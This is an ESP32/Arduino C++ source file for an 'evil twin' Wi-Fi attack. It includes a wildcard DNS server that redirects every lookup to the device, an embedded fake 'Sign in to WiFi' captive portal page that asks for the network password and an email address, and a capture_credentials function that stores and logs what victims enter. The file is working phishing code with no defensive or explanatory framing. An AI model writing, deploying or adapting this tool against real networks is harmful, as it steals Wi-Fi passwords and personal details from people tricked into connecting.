#include <WiFi.h>
#include <DNSServer.h>
#include "evil_twin.h"
#include "definitions.h"

DNSServer etDNS;
bool et_running = false;
int et_client_count = 0;
char et_target_ssid[33] = {0};
char et_captured[256] = {0};
int et_captured_len = 0;

const char ET_PORTAL_HTML[] PROGMEM = 
"<html><head><meta charset=\"UTF-8\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">"
"<title>Login Required</title>"
"<style>body{font-family:-apple-system,sans-serif;background:#1e293b;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}"
".box{background:#334155;padding:40px;border-radius:12px;max-width:400px;width:90%}"
"h1{color:#818cf8;margin-bottom:20px;text-align:center}"
"input{width:100%;padding:15px;margin:10px 0;border:none;border-radius:8px;background:#1e293b;color:#fff;font-size:16px}"
"button{width:100%;padding:15px;background:#6366f1;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;margin-top:10px}"
"button:hover{background:#4f46e5}"
".msg{background:#ef4444;padding:10px;border-radius:8px;margin-bottom:15px;text-align:center}</style></head>"
"<body><div class=\"box\"><h1>Sign in to WiFi</h1>"
"<p style=\"text-align:center;color:#94a3b8\">Password required to access internet</p>"
"<form method=\"POST\" action=\"/login\">"
"<input type=\"text\" name=\"ssid\" placeholder=\"Network Name\" readonly value=\"ET_SSID\">"
"<input type=\"password\" name=\"password\" placeholder=\"WiFi Password\" required>"
"<input type=\"email\" name=\"email\" placeholder=\"Email\" required>"
"<button type=\"submit\">Connect</button></form></div></body></html>";

void handleDNSRequest() {
  if (et_running) {
    etDNS.processNextRequest();
  }
}

void start_evil_twin(const char* target_ssid) {
  strncpy(et_target_ssid, target_ssid, 32);
  et_target_ssid[32] = 0;
  
  et_running = true;
  et_client_count = 0;
  et_captured_len = 0;
  memset(et_captured, 0, 256);
  
  etDNS.start(53, "*", WiFi.softAPIP());
  
  DEBUG_PRINT("Evil Twin started: ");
  DEBUG_PRINTLN(target_ssid);
}

void stop_evil_twin() {
  et_running = false;
  etDNS.stop();
  et_client_count = 0;
  memset(et_target_ssid, 0, 33);
  
  DEBUG_PRINTLN("Evil Twin stopped");
}

bool is_et_running() {
  return et_running;
}

int get_et_client_count() {
  return et_client_count;
}

const char* get_et_captured() {
  return et_captured;
}

void capture_credentials(const char* ssid, const char* password, const char* email) {
  et_captured_len = snprintf(et_captured, 255, "SSID:%s|PASS:%s|EMAIL:%s", ssid, password, email);
  DEBUG_PRINT("Credentials captured!");
  DEBUG_PRINTLN(et_captured);
}